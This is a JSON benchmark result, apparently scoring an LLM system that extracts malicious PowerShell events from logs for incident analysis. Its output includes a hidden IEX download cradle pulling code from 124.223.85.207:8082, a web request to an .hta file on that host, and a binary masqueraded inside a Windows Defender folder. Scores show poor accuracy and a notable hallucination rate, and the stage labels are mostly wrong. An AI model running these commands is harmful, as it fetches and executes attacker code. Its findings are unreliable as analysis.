@@ -1,0 +1,72 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\notepad.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-webrequest http://124.223.85.207:8082/test.hta -method post -usebasicparsing -contenttype application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"copy-item '.\\msxsl.exe' '\\program files\\windows defender\\avast antivirus\\avastupd.exe'\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"get-service | select -expandproperty status | sort -desc | select -first 1\" ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"get-childitem env: | select -expandproperty name | where {$_ -match '^PATH'}\",\"stage\": ",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attacker appears to be using PowerShell scripts to execute various tasks, likely as part of an information gathering phase. The use of PowerShell suggests that the attacker has gained access to the system through a means such as phishing or exploited vulnerability. The scripts appear to be downloading tools, modifying registry entries, creating temporary files, and executing commands remotely.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 235602,
+      "completion_tokens": 2922,
+      "total_tokens": 238524,
+      "wall_clock_s": 72.992,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.14285714285714285,
+      "recall": 0.043478260869565216,
+      "f1": 0.06666666666666667,
+      "tp": 1,
+      "fp": 6,
+      "fn": 22
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 7,
+      "fn": 23,
+      "recall_partial": 0.021739130434782608
+    },
+    "hallucination_rate": 0.2857142857142857,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 235602,
+      "completion_tokens": 2922,
+      "total_tokens": 238524,
+      "wall_clock_s": 72.992,
+      "parse_retries": 1
+    }
+  }
+}
